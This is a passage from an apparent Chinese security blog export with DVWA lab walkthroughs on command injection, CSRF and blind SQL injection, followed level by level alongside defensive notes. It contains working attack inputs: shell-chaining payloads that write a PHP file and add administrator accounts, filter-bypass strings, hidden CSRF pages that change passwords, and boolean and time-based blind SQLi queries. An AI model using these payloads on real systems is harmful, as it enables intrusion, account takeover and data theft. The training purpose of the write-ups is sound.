\u0026amp;\u0026amp; ipconfig   几个cmd命令\n查看用户：net user\n添加用户：net user name password/add\n name:用户名 password:密码  提升为管理员：net localgroup administrators/add\n查看管理员用户：net localgroup administrators\n删除用户：net user name/delete\n获取ip、DNS：ipconfig\nwhoami：查看目前的身份\n 回到题目\n输入127.0.0.1 \u0026amp;\u0026amp; ipconfig,成功回显：\n写个木马进来，127.0.0.1 \u0026amp;\u0026amp; echo \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;\u0026gt;c:\\shell.php\n写入成功\nMedium 先贴一下代码\n\u0026lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '\u0026amp;\u0026amp;' =\u0026gt; '', ';' =\u0026gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \u0026quot;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026quot;; } ?\u0026gt;  这里设置了黑名单\u0026amp;\u0026amp; 和 ;，替换为空\n可以使用双写绕过127.0.0.1\u0026amp;;\u0026amp; ipconfig\n当然也可以使用没有被过滤的\u0026amp;、||、|\nHigh 贴一下代码\n\u0026lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '\u0026amp;' =\u0026gt; '', ';' =\u0026gt; '', '| ' =\u0026gt; '', '-' =\u0026gt; '', '$' =\u0026gt; '', '(' =\u0026gt; '', ')' =\u0026gt; '', '`' =\u0026gt; '', '||' =\u0026gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \u0026quot;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026quot;; } ?\u0026gt;  不难看出，这个难度就是黑名单中有了更多禁止的内容。这种过滤都是基于规则，而只要是规则，都有漏洞可循。\n比如：过滤名单里有| ,后面有一个空格，那这样就直接可以借助|进行绕过。其余的比如加上\u0026amp;|这类的都是基于|不在黑名单里才可以实现，在这里就不一一赘述。\nPS：值得一提的是 当我输入 127.0.0.1 || whoami时竟然执行了，进行调试后发现并非是||没有被过滤，而是根据黑名单数组的顺序，优先过滤的是| ，结果就剩下来 |，则可以执行，说到底还是基于|没过滤\nImpossible \u0026lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( \u0026quot;.\u0026quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[1] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[2] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[3] ) ) \u0026amp;\u0026amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \u0026quot;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026quot;; } else { // Ops. Let the user name theres a mistake echo '\u0026lt;pre\u0026gt;ERROR: You have entered an invalid IP.\u0026lt;/pre\u0026gt;'; } } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  代码分析：\n这里首先采用了token令牌机制，用户每次提交表单时都附带提交一个token值，服务器将提交的token值与session或cookie中存储的token值进行比较，相同则通过请求，不同则过滤请求\n$octet = explode( \u0026quot;.\u0026quot;, $target );\n通过explode函数以.为分割符将$target变量中的IP地址进行分割，分割后会得到一个数组，并赋值给变量$octet\nif( ( is_numeric( $octet[0] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[1] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[2] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[3] ) ) \u0026amp;\u0026amp; ( sizeof( $octet ) == 4 ) )\n用is_numeric函数依次判断$octet数组中的每个值是否是数字型数据，并且还使用sizeof函数判断$octet数组中元素是否是4个\n防御   对传入的数据进行严格过滤，定义白名单，只允许输入IP地址\n  EscapeShellCmd()函数\n把字符串中可能瞒过Shell而去执行另外一个命令的字符转义，如管道符（|）、分号（；）、重定向（\u0026gt;）、从文件读入（\u0026lt;）等\n  EscapeShellArg()函数\n在给定的字符串两边加上单引号，并把字符串中的单引号转义，这样这个字符串就可以安全地作为命令的参数\n  可以修改low级别网页文件dvwa\\vulnerabilities\\exec\\source\\low.php进行测试\n    发现报错了\n  对后台对应用的权限进行控制（比如可以给PHP建立独立的账号，控制PHP的启动权限）Linux可以\n  ","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/dvwa%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/","tags":["DVWA"],"title":"从DVWA看Command Injection(命令注入）"},{"content":"CSRF是啥 CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。\nCSRF攻击原理   用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；\n  在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；\n  用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；\n  网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；\n  浏览器在接收到这些攻击性代码后，根据网站 B 的请求，在用户不知情的情况下携带 Cookie 信息，向网站 A 发出请求。网站 A 并不知道该请求其实是由 B 发起的，所以会根据用户 C 的 Cookie 信息以 C 的权限处理该请求，导致来自网站 B 的恶意代码被执行。\n  与XSS的区别 XSS是通过修改页面Javascript等代码后，发给用户从而实现盗取cookie信息，之后利用cookie进行登陆网站等操作。非法操作是黑客。 CSRF并没有盗取cookie信息，而是通过用户直接利用cookie进行操作。非法操作并不是黑客，而是用户本身。\nLow if( isset( $_GET[ 'Change' ] ) ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass_new ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = \u0026quot;UPDATE `users` SET password = '$pass_new' WHERE user = '\u0026quot; . dvwaCurrentUser() . \u0026quot;';\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $insert ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); // Feedback for the user echo \u0026quot;\u0026lt;pre\u0026gt;Password Changed.\u0026lt;/pre\u0026gt;\u0026quot;; } else { // Issue with passwords matching echo \u0026quot;\u0026lt;pre\u0026gt;Passwords did not match.\u0026lt;/pre\u0026gt;\u0026quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]))) ? false : $___mysqli_res); } ?\u0026gt;  可以看到，源码中的mysql_real_escape_string() 函数有防护sql注入的作用，然后就只进行了$pass_new == $pass_conf判断，没有进行任何的验证。\n漏洞利用\n构造链接\n1、最基础的\nhttp://localhost/dvwa/vulnerabilities/csrf/?password_new=password\u0026amp;password_conf=password\u0026amp;Change=Change#\n受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）\n需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。\n有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。\n2、我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：\n如 http://dwz-9.cn/1I4tu\n需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。\n3、构造攻击页面\n现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示，就在本地写一个test.html，下面是具体代码。\n\u0026lt;img src=\u0026quot;http://localhost/dvwa/vulnerabilities/csrf/?password_new=hack\u0026amp;password_conf=hack\u0026amp;Change=Change#\u0026quot; border=\u0026quot;0\u0026quot; style=\u0026quot;display:none;\u0026quot;/\u0026gt; \u0026lt;h1\u0026gt;404\u0026lt;h1\u0026gt; \u0026lt;h2\u0026gt;file not found.\u0026lt;h2\u0026gt;  当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。\nMedium \u0026lt;?php if( isset( $_GET[ 'Change' ] ) ) { echo \u0026quot;\\$_SERVER[ 'HTTP_REFERER' ] is \u0026quot;.$_SERVER[ 'HTTP_REFERER' ]; echo \u0026quot;\\$_SERVER[ 'SERVER_NAME' ] is \u0026quot;.$_SERVER[ 'SERVER_NAME' ]; echo stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]); // 自己添加的打印语句，用来查看变量的值 // Checks to see where the request came from //如果可以在HTTP头部的Referer字段中找到Host字段的内容，说明来自可信的源 if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass_new ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass_new = md5( $pass_new ); // Update the database，重置当前用户的密码 $insert = \u0026quot;UPDATE `users` SET password = '$pass_new' WHERE user = '\u0026quot; . dvwaCurrentUser() . \u0026quot;';\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $insert ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); // Feedback for the user $html .= \u0026quot;\u0026lt;pre\u0026gt;Password Changed.\u0026lt;/pre\u0026gt;\u0026quot;; } else { // Issue with passwords matching $html .= \u0026quot;\u0026lt;pre\u0026gt;Passwords did not match.\u0026lt;/pre\u0026gt;\u0026quot;; } } //如果不能在HTTP头部的Referer字段中找到Host字段的内容，说明来自可信的不可信源，提示用户，请求似乎看起来不正确 else { // Didn't come from a trusted source $html .= \u0026quot;\u0026lt;pre\u0026gt;That request didn't look correct.\u0026lt;/pre\u0026gt;\u0026quot;; }  相关函数说明\nint eregi(string pattern, string string)\n检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。\nStripos()函数查找字符串在另一个字符串中第一次出现的位置（不区分大小写）。\nstripos(string,find,start)\n   参数 描述     string 必需。规定被搜索的字符串。   find 必需。规定要查找的字符。   start 可选。规定开始搜索的位置。    可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是localhost），希望通过这种机制抵御CSRF攻击。\nPS：这里因为没有服务器，引用freebuf一位大佬博客\n漏洞利用\n过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）\n我们可以将攻击页面命名为192.168.153.130.html（页面被放置在攻击者的服务器里，这里是10.4.253.2）就可以绕过了\nReferer参数完美绕过过滤规则\n密码修改成功\nHigh \u0026lt;?php if( isset( $_GET[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass_new ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = \u0026quot;UPDATE `users` SET password = '$pass_new' WHERE user = '\u0026quot; . dvwaCurrentUser() . \u0026quot;';\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $insert ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); // Feedback for the user echo \u0026quot;\u0026lt;pre\u0026gt;Password Changed.\u0026lt;/pre\u0026gt;\u0026quot;; } else { // Issue with passwords matching echo \u0026quot;\u0026lt;pre\u0026gt;Passwords did not match.\u0026lt;/pre\u0026gt;\u0026quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。\n漏洞利用\n要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。\n试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。\n\u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; function attack() { document.getElementsByName('user_token')[0].value=document.getElementById(\u0026quot;hack\u0026quot;).contentWindow.document.getElementsByName('user_token')[0].value; document.getElementById(\u0026quot;transfer\u0026quot;).submit(); } \u0026lt;/script\u0026gt; \u0026lt;iframe src=\u0026quot;http://192.168.153.130/dvwa/vulnerabilities/csrf\u0026quot; id=\u0026quot;hack\u0026quot; border=\u0026quot;0\u0026quot; style=\u0026quot;display:none;\u0026quot;\u0026gt; \u0026lt;/iframe\u0026gt; \u0026lt;body onload=\u0026quot;attack()\u0026quot;\u0026gt; \u0026lt;form method=\u0026quot;GET\u0026quot; id=\u0026quot;transfer\u0026quot; action=\u0026quot;http://192.168.153.130/dvwa/vulnerabilities/csrf\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;password_new\u0026quot; value=\u0026quot;password\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;password_conf\u0026quot; value=\u0026quot;password\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;user_token\u0026quot; value=\u0026quot;\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;Change\u0026quot; value=\u0026quot;Change\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt;  攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。\n然而理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是http://192.168.153.130/dvwa/vulnerabilities/csrf，位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。\n由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.153.130中，才有可能完成攻击。下面利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token）。\n这里的Name存在XSS漏洞，于是抓包，改参数，成功弹出token\n注入代码如下\nImpossible \u0026lt;?php if( isset( $_GET[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_curr = $_GET[ 'password_current' ]; $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass_curr ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-\u0026gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data-\u0026gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data-\u0026gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR ); $data-\u0026gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) \u0026amp;\u0026amp; ( $data-\u0026gt;rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass_new ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-\u0026gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); $data-\u0026gt;bindParam( ':password', $pass_new, PDO::PARAM_STR ); $data-\u0026gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data-\u0026gt;execute(); // Feedback for the user echo \u0026quot;\u0026lt;pre\u0026gt;Password Changed.\u0026lt;/pre\u0026gt;\u0026quot;; } else { // Issue with passwords matching echo \u0026quot;\u0026lt;pre\u0026gt;Passwords did not match or current password incorrect.\u0026lt;/pre\u0026gt;\u0026quot;; } } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/dvwacsrf/","tags":["DVWA"],"title":"从DVWA看CSRF"},{"content":"定义 SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。\n手工盲注思路 手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。\n盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。\n下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：\n 1.判断是否存在注入，注入是字符型还是数字型\n2.猜解当前数据库名\n3.猜解数据库中的表名\n4.猜解表中的字段名\n5.猜解数据\n 危害 因为也属于SQL注入中的一类，所以危害和SQL注入（有回显的）一样\n解题篇 Low 先贴一下代码\n\u0026lt;?php if( isset( $_GET[ 'Submit' ] ) ) { // Get input $id = $_GET[ 'id' ]; // Check database $getid = \u0026quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors if( $num \u0026gt; 0 ) { // Feedback for end user echo '\u0026lt;pre\u0026gt;User ID exists in the database.\u0026lt;/pre\u0026gt;'; } else { // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '\u0026lt;pre\u0026gt;User ID is MISSING from the database.\u0026lt;/pre\u0026gt;'; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]))) ? false : $___mysqli_res); } ?\u0026gt;  可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种\n User ID exists in the database. //说明ID存在\n  User ID is MISSING from the database. //说明ID不存在\n 因此这里是SQL盲注漏洞。\n漏洞利用\n手注法 1.判断是否存在注入，注入是字符型还是数字型\n输入1，显示相应用户存在\n输入1'and 1=1 #，显示存在\n输入1' and 1=2 #，显示不存在\n说明存在字符型的SQL盲注。\n2.猜解当前数据库名\n想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。\n输入1' and length(database())=1 #，显示不存在； 输入1' and length(database())=2 #，显示不存在； 输入1' and length(database())=3 #，显示不存在； 输入1' and length(database())=4 #，显示存在：  说明数据库名长度为4。\n下面采用二分法猜解数据库名。\n输入1' and ascii(substr(database(),1,1))\u0026gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）； 输入1' and ascii(substr(database(),1,1))\u0026lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）； 输入1' and ascii(substr(database(),1,1))\u0026lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）； 输入1' and ascii(substr(database(),1,1))\u0026lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）； 输入1' and ascii(substr(database(),1,1))\u0026lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）； 输入1' and ascii(substr(database(),1,1))\u0026gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。 ...  重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。\n3.猜解数据库中的表名\n首先猜解数据库中表的数量：\n1' and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在 1' and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在  说明数据库中共有两个表。\n接着挨个猜解表名：\n1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在 1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在 ... 1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在  说明第一个表名长度为9。\n1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))\u0026gt;97 # 显示存在 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))\u0026lt;122 # 显示存在 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))\u0026lt;109 # 显示存在 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))\u0026lt;103 # 显示不存在 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))\u0026gt;103 # 显示不存在  说明第一个表的名字的第一个字符为小写字母g。\n重复上述步骤，即可猜解出两个表名（guestbook、users）。\n4.猜解表中的字段名\n首先猜解表中字段的数量：\n1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 # 显示不存在 ... 1' and (select count(column_name) from information_schema.columns where table_name= 'users')=8 # 显示存在  说明users表有8个字段。\n接着挨个猜解字段名：\n1' and length(substr((select column_name from information_schema.columns where table_name= 'users'limit 0,1),1))=1 # 显示不存在 ... 1' and length(substr((select column_name from information_schema.columns where table_name= 'users'limit 0,1),1))=7 # 显示存在  说明users表的第一个字段为7个字符长度。\n采用二分法，即可猜解出所有字段名。\n5.猜解数据\n同样采用二分法。\n还可以使用基于时间的盲注：\n1.判断是否存在注入，注入是字符型还是数字型\n输入1' and sleep(5) #，感觉到明显延迟； 输入1 and sleep(5) #，没有延迟；  说明存在字符型的基于时间的盲注。\n2.猜解当前数据库名\n首先猜解数据名的长度：\n1' and if(length(database())=1,sleep(5),1) # 没有延迟 1' and if(length(database())=2,sleep(5),1) # 没有延迟 1' and if(length(database())=3,sleep(5),1) # 没有延迟 1' and if(length(database())=4,sleep(5),1) # 明显延迟  说明数据库名长度为4个字符。\n接着采用二分法猜解数据库名：\n1' and if(ascii(substr(database(),1,1))\u0026gt;97,sleep(5),1)# 明显延迟 ... 1' and if(ascii(substr(database(),1,1))\u0026lt;100,sleep(5),1)# 没有延迟 1' and if(ascii(substr(database(),1,1))\u0026gt;100,sleep(5),1)# 没有延迟 说明数据库名的第一个字符为小写字母d。 ...  重复上述步骤，即可猜解出数据库名。\n3.猜解数据库中的表名\n首先猜解数据库中表的数量：\n1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟 1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟  说明数据库中有两个表。\n接着挨个猜解表名：\n1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟 ... 1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟  说明第一个表名的长度为9个字符。\n采用二分法即可猜解出表名。\n4.猜解表中的字段名\n首先猜解表中字段的数量：\n1' and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟 ... 1' and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟  说明users表中有8个字段。\n接着挨个猜解字段名：\n1' and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟 ... 1' and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟  说明users表的第一个字段长度为7个字符。\n采用二分法即可猜解出各个字段名。\n5.猜解数据\n同样采用二分法。\n这里的话看上去十分的麻烦\u0026hellip;\n这里再使用两个工具，一个是 ==Burp== ,一个是==SQLMAP==\n这里先使用burp，原理是一样的，只不过简化了步骤\nBURP法 直接从第二步 猜解当前数据库名 开始\n输入1' and length(database())=1 # 然后抓包，发送到Intruder 模块\n然后设置Intruder\nPositions部分\nPayloads部分\n然后点击右上角的Start attack\n爆破完成后点击length\n这里可以看得到 4 和其他的数字不同，那么就说明数据库的长度是 4\n再比方说利用ascii码获取数据库名字\n输入 1' and ascii(substr(database(),1,1))=97 # 这是拆解数据库第一个字段，抓这个包\nPositions部分\nPayloads部分\n然后点击右上角的Start 